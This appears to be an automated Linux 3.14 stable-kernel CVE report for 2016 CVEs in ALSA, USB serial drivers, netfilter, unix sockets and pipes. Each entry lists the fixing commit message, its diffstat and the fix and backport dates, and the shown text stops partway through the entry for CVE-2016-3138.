 sound/usb/midi.c |    1 -
 1 file changed, 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2384
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-02-13
Linus Commit: 07d86ca93db7e5cdf4743564d98292042ec21af7
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: 05dd81eafd796a5f1db09cc9fe2bff44cfd56dfe
Stable Tag: 3.14.61

CVE-2016-2543:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 030e2c78d3a91dd0d27fef37e91950dde333eba1
Author: Takashi Iwai <tiwai@suse.de>
Date:   Tue Jan 12 12:38:02 2016 +0100

    ALSA: seq: Fix missing NULL check at remove_events ioctl
    
    snd_seq_ioctl_remove_events() calls snd_seq_fifo_clear()
    unconditionally even if there is no FIFO assigned, and this leads to
    an Oops due to NULL dereference.  The fix is just to add a proper NULL
    check.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/seq/seq_clientmgr.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2543
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-12
Linus Commit: 030e2c78d3a91dd0d27fef37e91950dde333eba1
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: 9174b70002e1497e93242de7570a842497b3de97
Stable Tag: 3.14.60

CVE-2016-2544:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 3567eb6af614dac436c4b16a8d426f9faed639b3
Author: Takashi Iwai <tiwai@suse.de>
Date:   Tue Jan 12 15:36:27 2016 +0100

    ALSA: seq: Fix race at timer setup and close
    
    ALSA sequencer code has an open race between the timer setup ioctl and
    the close of the client.  This was triggered by syzkaller fuzzer, and
    a use-after-free was caught there as a result.
    
    This patch papers over it by adding a proper queue->timer_mutex lock
    around the timer-related calls in the relevant code path.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/seq/seq_queue.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2544
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-12
Linus Commit: 3567eb6af614dac436c4b16a8d426f9faed639b3
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: 7038cd337653a65b779aeff9f161b937339b40e3
Stable Tag: 3.14.60

CVE-2016-2545:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ee8413b01045c74340aa13ad5bdf905de32be736
Author: Takashi Iwai <tiwai@suse.de>
Date:   Wed Jan 13 21:35:06 2016 +0100

    ALSA: timer: Fix double unlink of active_list
    
    ALSA timer instance object has a couple of linked lists and they are
    unlinked unconditionally at snd_timer_stop().  Meanwhile
    snd_timer_interrupt() unlinks it, but it calls list_del() which leaves
    the element list itself unchanged.  This ends up with unlinking twice,
    and it was caught by syzkaller fuzzer.
    
    The fix is to use list_del_init() variant properly there, too.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2545
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-13
Linus Commit: ee8413b01045c74340aa13ad5bdf905de32be736
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: d7b84f78c7a0b8ba3fde43a64faf0d69ada4d987
Stable Tag: 3.14.60

CVE-2016-2546:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit af368027a49a751d6ff4ee9e3f9961f35bb4fede
Author: Takashi Iwai <tiwai@suse.de>
Date:   Wed Jan 13 17:48:01 2016 +0100

    ALSA: timer: Fix race among timer ioctls
    
    ALSA timer ioctls have an open race and this may lead to a
    use-after-free of timer instance object.  A simplistic fix is to make
    each ioctl exclusive.  We have already tread_sem for controlling the
    tread, and extend this as a global mutex to be applied to each ioctl.
    
    The downside is, of course, the worse concurrency.  But these ioctls
    aren't to be parallel accessible, in anyway, so it should be fine to
    serialize there.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |   32 +++++++++++++++++++-------------
 1 file changed, 19 insertions(+), 13 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2546
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-14
Linus Commit: af368027a49a751d6ff4ee9e3f9961f35bb4fede
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: 7510c77227536d85013016289c96dd1fe212db77
Stable Tag: 3.14.60

CVE-2016-2547:
CVE-2016-2548:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b5a663aa426f4884c71cd8580adae73f33570f0d
Author: Takashi Iwai <tiwai@suse.de>
Date:   Thu Jan 14 16:30:58 2016 +0100

    ALSA: timer: Harden slave timer list handling
    
    A slave timer instance might be still accessible in a racy way while
    operating the master instance as it lacks of locking.  Since the
    master operation is mostly protected with timer->lock, we should cope
    with it while changing the slave instance, too.  Also, some linked
    lists (active_list and ack_list) of slave instances aren't unlinked
    immediately at stopping or closing, and this may lead to unexpected
    accesses.
    
    This patch tries to address these issues.  It adds spin lock of
    timer->lock (either from master or slave, which is equivalent) in a
    few places.  For avoiding a deadlock, we ensure that the global
    slave_active_lock is always locked at first before each timer lock.
    
    Also, ack and active_list of slave instances are properly unlinked at
    snd_timer_stop() and snd_timer_close().
    
    Last but not least, remove the superfluous call of _snd_timer_stop()
    at removing slave links.  This is a noop, and calling it may confuse
    readers wrt locking.  Further cleanup will follow in a later patch.
    
    Actually we've got reports of use-after-free by syzkaller fuzzer, and
    this hopefully fixes these issues.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |   18 ++++++++++++++----
 1 file changed, 14 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2547
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-15
Linus Commit: b5a663aa426f4884c71cd8580adae73f33570f0d
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: ac5f6f7d25339feacc5f1dc39d3100e5520e7ca2
Stable Tag: 3.14.60

CVE-2016-2547:
CVE-2016-2548:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b5a663aa426f4884c71cd8580adae73f33570f0d
Author: Takashi Iwai <tiwai@suse.de>
Date:   Thu Jan 14 16:30:58 2016 +0100

    ALSA: timer: Harden slave timer list handling
    
    A slave timer instance might be still accessible in a racy way while
    operating the master instance as it lacks of locking.  Since the
    master operation is mostly protected with timer->lock, we should cope
    with it while changing the slave instance, too.  Also, some linked
    lists (active_list and ack_list) of slave instances aren't unlinked
    immediately at stopping or closing, and this may lead to unexpected
    accesses.
    
    This patch tries to address these issues.  It adds spin lock of
    timer->lock (either from master or slave, which is equivalent) in a
    few places.  For avoiding a deadlock, we ensure that the global
    slave_active_lock is always locked at first before each timer lock.
    
    Also, ack and active_list of slave instances are properly unlinked at
    snd_timer_stop() and snd_timer_close().
    
    Last but not least, remove the superfluous call of _snd_timer_stop()
    at removing slave links.  This is a noop, and calling it may confuse
    readers wrt locking.  Further cleanup will follow in a later patch.
    
    Actually we've got reports of use-after-free by syzkaller fuzzer, and
    this hopefully fixes these issues.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/timer.c |   18 ++++++++++++++----
 1 file changed, 14 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2547
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-15
Linus Commit: b5a663aa426f4884c71cd8580adae73f33570f0d
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: ac5f6f7d25339feacc5f1dc39d3100e5520e7ca2
Stable Tag: 3.14.60

CVE-2016-2549:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 2ba1fe7a06d3624f9a7586d672b55f08f7c670f3
Author: Takashi Iwai <tiwai@suse.de>
Date:   Mon Jan 18 13:52:47 2016 +0100

    ALSA: hrtimer: Fix stall by hrtimer_cancel()
    
    hrtimer_cancel() waits for the completion from the callback, thus it
    must not be called inside the callback itself.  This was already a
    problem in the past with ALSA hrtimer driver, and the early commit
    [fcfdebe70759: ALSA: hrtimer - Fix lock-up] tried to address it.
    
    However, the previous fix is still insufficient: it may still cause a
    lockup when the ALSA timer instance reprograms itself in its callback.
    Then it invokes the start function even in snd_timer_interrupt() that
    is called in hrtimer callback itself, results in a CPU stall.  This is
    no hypothetical problem but actually triggered by syzkaller fuzzer.
    
    This patch tries to fix the issue again.  Now we call
    hrtimer_try_to_cancel() at both start and stop functions so that it
    won't fall into a deadlock, yet giving some chance to cancel the queue
    if the functions have been called outside the callback.  The proper
    hrtimer_cancel() is called in anyway at closing, so this should be
    enough.
    
    Reported-and-tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/hrtimer.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2549
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: 2ba1fe7a06d3624f9a7586d672b55f08f7c670f3
Linus Tag: 4.5
Stable Date: 2016-01-28
Stable Commit: 73672733af0278e554eec8fc33de13b0d4a860be
Stable Tag: 3.14.60

CVE-2016-2550:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 415e3d3e90ce9e18727e8843ae343eda5a58fad6
Author: Hannes Frederic Sowa <hannes@stressinduktion.org>
Date:   Wed Feb 3 02:11:03 2016 +0100

    unix: correctly track in-flight fds in sending process user_struct
    
    The commit referenced in the Fixes tag incorrectly accounted the number
    of in-flight fds over a unix domain socket to the original opener
    of the file-descriptor. This allows another process to arbitrary
    deplete the original file-openers resource limit for the maximum of
    open files. Instead the sending processes and its struct cred should
    be credited.
    
    To do so, we add a reference counted struct user_struct pointer to the
    scm_fp_list and use it to account for the number of inflight unix fds.
    
    Fixes: 712f4aad406bb1 ("unix: properly account for FDs passed over unix sockets")
    Reported-by: David Herrmann <dh.herrmann@gmail.com>
    Cc: David Herrmann <dh.herrmann@gmail.com>
    Cc: Willy Tarreau <w@1wt.eu>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/af_unix.h |    4 ++--
 include/net/scm.h     |    1 +
 net/core/scm.c        |    7 +++++++
 net/unix/af_unix.c    |    4 ++--
 net/unix/garbage.c    |    8 ++++----
 5 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2550
Break Date: 2016-01-11
Break Commit: 712f4aad406bb1ed67f3f98d04c044191f0ff593
Break Tag: 4.5
Linus Fix Date: 2016-02-08
Linus Commit: 415e3d3e90ce9e18727e8843ae343eda5a58fad6
Linus Tag: 4.5
Stable Date: 2016-03-03
Stable Commit: 780f6783bddda8603d919bba5707034714dbee71
Stable Tag: 3.14.63

CVE-2016-2782:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit cac9b50b0d75a1d50d6c056ff65c005f3224c8e0
Author: Johan Hovold <johan@kernel.org>
Date:   Tue Jan 12 12:05:20 2016 +0100

    USB: visor: fix null-deref at probe
    
    Fix null-pointer dereference at probe should a (malicious) Treo device
    lack the expected endpoints.
    
    Specifically, the Treo port-setup hack was dereferencing the bulk-in and
    interrupt-in urbs without first making sure they had been allocated by
    core.
    
    Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Johan Hovold <johan@kernel.org>

 drivers/usb/serial/visor.c |    5 +++++
 1 file changed, 5 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2782
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-25
Linus Commit: cac9b50b0d75a1d50d6c056ff65c005f3224c8e0
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: 897d109d4b52532f7ecf24c4294f42d1e62b1289
Stable Tag: 3.14.61

CVE-2016-2847:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 759c01142a5d0f364a462346168a56de28a80f52
Author: Willy Tarreau <w@1wt.eu>
Date:   Mon Jan 18 16:36:09 2016 +0100

    pipe: limit the per-user amount of pages allocated in pipes
    
    On no-so-small systems, it is possible for a single process to cause an
    OOM condition by filling large pipes with data that are never read. A
    typical process filling 4000 pipes with 1 MB of data will use 4 GB of
    memory. On small systems it may be tricky to set the pipe max size to
    prevent this from happening.
    
    This patch makes it possible to enforce a per-user soft limit above
    which new pipes will be limited to a single page, effectively limiting
    them to 4 kB each, as well as a hard limit above which no new pipes may
    be created for this user. This has the effect of protecting the system
    against memory abuse without hurting other users, and still allowing
    pipes to work correctly though with less data at once.
    
    The limit are controlled by two new sysctls : pipe-user-pages-soft, and
    pipe-user-pages-hard. Both may be disabled by setting them to zero. The
    default soft limit allows the default number of FDs per process (1024)
    to create pipes of the default size (64kB), thus reaching a limit of 64MB
    before starting to create only smaller pipes. With 256 processes limited
    to 1024 FDs each, this results in 1024*64kB + (256*1024 - 1024) * 4kB =
    1084 MB of memory allocated for a user. The hard limit is disabled by
    default to avoid breaking existing applications that make intensive use
    of pipes (eg: for splicing).
    
    Reported-by: socketpair@gmail.com
    Reported-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
    Mitigates: CVE-2013-4312 (Linux 2.0+)
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Willy Tarreau <w@1wt.eu>
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 Documentation/sysctl/fs.txt |   23 +++++++++++++++++++++
 fs/pipe.c                   |   47 +++++++++++++++++++++++++++++++++++++++++--
 include/linux/pipe_fs_i.h   |    4 ++++
 include/linux/sched.h       |    1 +
 kernel/sysctl.c             |   14 +++++++++++++
 5 files changed, 87 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2847
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-19
Linus Commit: 759c01142a5d0f364a462346168a56de28a80f52
Linus Tag: 4.5
Stable Date: 2016-06-24
Stable Commit: c098acd272f1323e47ca52ec016f1a62d26b6573
Stable Tag: 3.14.73

CVE-2016-3070:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 42cb14b110a5698ccf26ce59c4441722605a3743
Author: Hugh Dickins <hughd@google.com>
Date:   Thu Nov 5 18:50:05 2015 -0800

    mm: migrate dirty page without clear_page_dirty_for_io etc
    
    clear_page_dirty_for_io() has accumulated writeback and memcg subtleties
    since v2.6.16 first introduced page migration; and the set_page_dirty()
    which completed its migration of PageDirty, later had to be moderated to
    __set_page_dirty_nobuffers(); then PageSwapBacked had to skip that too.
    
    No actual problems seen with this procedure recently, but if you look into
    what the clear_page_dirty_for_io(page)+set_page_dirty(newpage) is actually
    achieving, it turns out to be nothing more than moving the PageDirty flag,
    and its NR_FILE_DIRTY stat from one zone to another.
    
    It would be good to avoid a pile of irrelevant decrementations and
    incrementations, and improper event counting, and unnecessary descent of
    the radix_tree under tree_lock (to set the PAGECACHE_TAG_DIRTY which
    radix_tree_replace_slot() left in place anyway).
    
    Do the NR_FILE_DIRTY movement, like the other stats movements, while
    interrupts still disabled in migrate_page_move_mapping(); and don't even
    bother if the zone is the same.  Do the PageDirty movement there under
    tree_lock too, where old page is frozen and newpage not yet visible:
    bearing in mind that as soon as newpage becomes visible in radix_tree, an
    un-page-locked set_page_dirty() might interfere (or perhaps that's just
    not possible: anything doing so should already hold an additional
    reference to the old page, preventing its migration; but play safe).
    
    But we do still need to transfer PageDirty in migrate_page_copy(), for
    those who don't go the mapping route through migrate_page_move_mapping().
    
    Signed-off-by: Hugh Dickins <hughd@google.com>
    Cc: Christoph Lameter <cl@linux.com>
    Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>
    Cc: Rik van Riel <riel@redhat.com>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Cc: Davidlohr Bueso <dave@stgolabs.net>
    Cc: Oleg Nesterov <oleg@redhat.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Cc: Dmitry Vyukov <dvyukov@google.com>
    Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/migrate.c |   51 +++++++++++++++++++++++++++++++--------------------
 1 file changed, 31 insertions(+), 20 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-3070
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-11-05
Linus Commit: 42cb14b110a5698ccf26ce59c4441722605a3743
Linus Tag: 4.4
Stable Date: 2016-08-16
Stable Commit: 53a35fd395a1d7fdcab6477621358833ea27897b
Stable Tag: 3.14.76

CVE-2016-3134:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 54d83fc74aa9ec72794373cb47432c5f7fb1a309
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:52 2016 +0100

    netfilter: x_tables: fix unconditional helper
    
    Ben Hawkes says:
    
     In the mark_source_chains function (net/ipv4/netfilter/ip_tables.c) it
     is possible for a user-supplied ipt_entry structure to have a large
     next_offset field. This field is not bounds checked prior to writing a
     counter value at the supplied offset.
    
    Problem is that mark_source_chains should not have been called --
    the rule doesn't have a next entry, so its supposed to return
    an absolute verdict of either ACCEPT or DROP.
    
    However, the function conditional() doesn't work as the name implies.
    It only checks that the rule is using wildcard address matching.
    
    However, an unconditional rule must also not be using any matches
    (no -m args).
    
    The underflow validator only checked the addresses, therefore
    passing the 'unconditional absolute verdict' test, while
    mark_source_chains also tested for presence of matches, and thus
    proceeeded to the next (not-existent) rule.
    
    Unify this so that all the callers have same idea of 'unconditional rule'.
    
    Reported-by: Ben Hawkes <hawkes@google.com>
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   18 +++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   23 +++++++++++------------
 net/ipv6/netfilter/ip6_tables.c |   23 +++++++++++------------
 3 files changed, 31 insertions(+), 33 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 54d83fc74aa9ec72794373cb47432c5f7fb1a309
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: a1a184a2f31575dba677514f2de22ddf1671ad81
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:50 2016 +0100

    netfilter: x_tables: make sure e->next_offset covers remaining blob size
    
    Otherwise this function may read data beyond the ruleset blob.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |    6 ++++--
 net/ipv4/netfilter/ip_tables.c  |    6 ++++--
 net/ipv6/netfilter/ip6_tables.c |    6 ++++--
 3 files changed, 12 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: e0b84cd87763c3bd442a06942ca90a60a7e152e7
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit bdf533de6968e9686df777dc178486f600c6e617
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:49 2016 +0100

    netfilter: x_tables: validate e->target_offset early
    
    We should check that e->target_offset is sane before
    mark_source_chains gets called since it will fetch the target entry
    for loop detection.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   17 ++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   17 ++++++++---------
 net/ipv6/netfilter/ip6_tables.c |   17 ++++++++---------
 3 files changed, 24 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: bdf533de6968e9686df777dc178486f600c6e617
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: 411c8508d4d0cb1e75343da53aaf26764bf4b9fe
Stable Tag: 3.14.73

CVE-2016-3135:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit d157bd761585605b7882935ffb86286919f62ea1
Author: Florian Westphal <fw@strlen.de>
Date:   Thu Mar 10 01:56:23 2016 +0100

    netfilter: x_tables: check for size overflow
    
    Ben Hawkes says:
     integer overflow in xt_alloc_table_info, which on 32-bit systems can
     lead to small structure allocation and a copy_from_user based heap
     corruption.
    
    Reported-by: Ben Hawkes <hawkes@google.com>
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/netfilter/x_tables.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3135
Break Date: 2015-06-15
Break Commit: 711bdde6a884354ddae8da2fcb495b2a9364cc90
Break Tag: 4.2
Linus Fix Date: 2016-03-12
Linus Commit: d157bd761585605b7882935ffb86286919f62ea1
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3136:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4e9a0b05257f29cf4b75f3209243ed71614d062e
Author: Oliver Neukum <oneukum@suse.com>
Date:   Thu Mar 31 12:04:24 2016 -0400

    USB: mct_u232: add sanity checking in probe
    
    An attack using the lack of sanity checking in probe is known. This
    patch checks for the existence of a second port.
    
    CVE-2016-3136
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    CC: stable@vger.kernel.org
    [johan: add error message ]
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/serial/mct_u232.c |    9 ++++++++-
 1 file changed, 8 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3136
Break Date: 2005-04-16
Break Commit: 1da177e4c3f41524e886b7f1b8a0c1fc7321cac2
Break Tag: 2.6
Linus Fix Date: 2016-03-31
Linus Commit: 4e9a0b05257f29cf4b75f3209243ed71614d062e
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 26f205bf2fa5aef26fd0762dbdf66198dfde924c
Stable Tag: 3.14.66

CVE-2016-3137:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754
Author: Oliver Neukum <oneukum@suse.com>
Date:   Thu Mar 31 12:04:25 2016 -0400

    USB: cypress_m8: add endpoint sanity check
    
    An attack using missing endpoints exists.
    
    CVE-2016-3137
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    CC: stable@vger.kernel.org
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/serial/cypress_m8.c |   11 +++++------
 1 file changed, 5 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3137
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-31
Linus Commit: c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 59abff9d0ce434487cbfd8c25e75bb30d8be1a52
Stable Tag: 3.14.66

CVE-2016-3138:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
